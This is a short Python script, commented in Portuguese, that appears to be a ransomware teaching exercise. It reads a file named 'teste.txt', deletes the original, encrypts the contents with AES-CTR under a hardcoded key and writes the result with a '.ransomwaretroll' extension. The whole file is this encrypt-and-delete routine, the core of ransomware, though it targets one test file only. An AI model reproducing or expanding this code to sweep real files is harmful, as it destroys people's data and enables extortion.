import os
import pyaes

## linha de código para abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## linha de código para remover o arquivo
os.remove(file_name)

## linha de código chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

##  linha de código criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## linha de código salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()